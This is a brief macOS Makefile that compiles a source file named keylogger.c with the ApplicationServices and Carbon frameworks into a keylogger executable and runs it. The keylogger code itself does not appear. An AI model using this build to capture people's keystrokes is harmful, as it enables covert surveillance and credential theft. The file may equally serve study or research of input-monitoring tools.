CC=clang
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c

EXECUTABLE=keylogger-nobe4-29a9ebf1-f246-4859-b0e2-40c8bc80cdc3

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

run:
	./$(EXECUTABLE)
